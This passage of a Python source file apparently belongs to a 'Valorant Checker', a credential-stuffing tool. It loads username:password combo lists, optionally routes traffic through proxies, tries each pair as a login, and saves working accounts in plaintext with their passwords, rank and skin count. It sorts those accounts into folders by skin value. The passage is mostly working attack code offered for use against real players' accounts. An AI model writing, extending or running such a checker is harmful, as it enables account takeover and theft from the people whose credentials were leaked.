            response = requests.get('https://valorant-api.com/v1/version', timeout=10)
            if response.status_code == 200:
                return response.json()['data']['riotClientVersion']
        except:
            pass
        return "release-10.00-shipping-8-2539489"

    def save_account_info(self, account_info):
        if not account_info:
            return

        skin_count = account_info.get('skin_count', 0)
        game_name = account_info.get('game_name', 'unknown')
        tag_line = account_info.get('tag_line', '0000')
        username = account_info.get('username', 'unknown')
        password = account_info.get('password', 'unknown')

        hit_data = f"{username}:{password}|Game: {game_name}#{tag_line}|Skins: {skin_count}|Rank: {account_info.get('current_rank', 'N/A')}"
        self.results_organizer.save_hit("Valorant Checker", hit_data, self.session_start_time)

        folder_name = None
        for name, (min_skins, max_skins) in skin_folders.items():
            if min_skins <= skin_count <= max_skins:
                folder_name = name
                break

        if not folder_name:
            folder_name = "0-4"

        folder_path = os.path.join(working_accounts_dir, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        base_filename = f"{skin_count}skin_{game_name}#{tag_line}.txt"
        file_path = os.path.join(folder_path, base_filename)
        
        counter = 1
        while os.path.exists(file_path):
            file_path = os.path.join(folder_path, f"{skin_count}skin_{counter}_{game_name}#{tag_line}.txt")
            counter += 1

        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(account_info, f, indent=4, ensure_ascii=False)
            self.update_log(f"[+] Account saved: {file_path}")
        except Exception as e:
            self.update_log(f"[-] Account save error: {str(e)}")

    def start_checking(self):
        combos = self.read_combos(self.combo_file_path)
        if not combos:
            print(f"\n{Fore.RED}[-] No accounts found in combo file!{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return

        self.session_start_time = datetime.now()
        
        self.clear_screen()
        self.print_banner()
        
        self.running = True
        self.total_count = len(combos)
        self.success_count = 0
        self.failed_count = 0
        
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                         {Fore.YELLOW}STARTING CHECK{Fore.CYAN}                                         ║")
        print(f"{Fore.CYAN}╠════════════════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.GREEN}Total Accounts:{Fore.WHITE} {len(combos):<62}{Fore.CYAN}║")
        proxy_status = f"{len(self.working_proxies)} proxies" if self.proxy_enabled else "No proxy"
        print(f"{Fore.CYAN}║  {Fore.MAGENTA}Proxy Status:{Fore.WHITE} {proxy_status:<64}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

        for i, (username, password) in enumerate(combos, 1):
            if not self.running:
                break
            
            self.current_account = f"{username}:{password}"
            print(f"\n{Fore.YELLOW}[{i}/{len(combos)}] {Fore.CYAN}Checking: {Fore.WHITE}{username}{Style.RESET_ALL}")
            
            access_token = self.perform_login(username, password)
            
            if access_token:
                self.success_count += 1
                account_info = self.get_account_info_and_entitlements(access_token, username, password)
                if not account_info:
                    self.update_log(f"[-] Failed to get account info for valid login: {username}")
            else:
                self.failed_count += 1
                self.update_log(f"[-] Successfully counted invalid login: {username}")
            
            print(self.print_stats_box())
            
            if i < len(combos):
                time.sleep(2)

        for window in self.windows[:]:
            self.safe_close(window)
        self.windows.clear()

        stats = {
            'total_checked': self.total_count,
            'valid_accounts': self.success_count,
            'invalid_accounts': self.failed_count,
            'success_rate': (self.success_count / self.total_count * 100) if self.total_count > 0 else 0,
            'proxy_enabled': self.proxy_enabled,
            'working_proxies': len(self.working_proxies) if self.proxy_enabled else 0
        }
        self.results_organizer.save_stats("Valorant Checker", stats, self.session_start_time)

        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║                         {Fore.YELLOW}CHECK COMPLETED!{Fore.GREEN}                                       ║")
        print(f"╠════════════════════════════════════════════════════════════════════════════════╣")
        print(f"║  {Fore.GREEN}[+] Valid:{Fore.WHITE} {self.success_count:<67}{Fore.GREEN}║")
        print(f"║  {Fore.RED}[-] Invalid:{Fore.WHITE} {self.failed_count:<65}{Fore.GREEN}║")
        print(f"║  {Fore.YELLOW}[*] Total:{Fore.WHITE} {self.total_count:<67}{Fore.GREEN}║")
        print(f"║  {Fore.CYAN}[📁] Results saved to: results/Valorant Checker/{self.session_start_time.strftime('%Y-%m-%d_%H-%M-%S')}/{' ' * (20)}{Fore.GREEN}║")
        print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to return to menu...{Style.RESET_ALL}")
        self.running = False

    def run(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input(f"\n{Fore.GREEN}Select option (1-6): {Style.RESET_ALL}").strip()
            
            if choice == "1":
                self.select_combo_file()
            elif choice == "2":
                self.load_and_test_proxies()
            elif choice == "3":
                self.start_checking()
            elif choice == "4":
                self.show_statistics()
            elif choice == "5":
                self.view_successful_accounts()
            elif choice == "6":
                self.clear_screen()
                print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
                print(f"{Fore.CYAN}║                                                                                ║")
                print(f"{Fore.CYAN}║                  {Fore.YELLOW}Thank you for using Valorant Checker!{Fore.CYAN}                         ║")
                print(f"{Fore.CYAN}║                                                                                ║")
                print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
                sys.exit(0)
            else:
                print(f"\n{Fore.RED}[-] Invalid choice! Please select 1-6.{Style.RESET_ALL}")
                time.sleep(2)

if __name__ == "__main__":
    try:
        checker = ValorantChecker()
        checker.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Program terminated.{Style.RESET_ALL}")
        if hasattr(checker, 'windows'):
            for window in checker.windows[:]:
                try:
                    window.destroy()
                except:
                    pass
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        input(f"\n{Fore.YELLOW}Press Enter to exit...{Style.RESET_ALL}")
        sys.exit(1)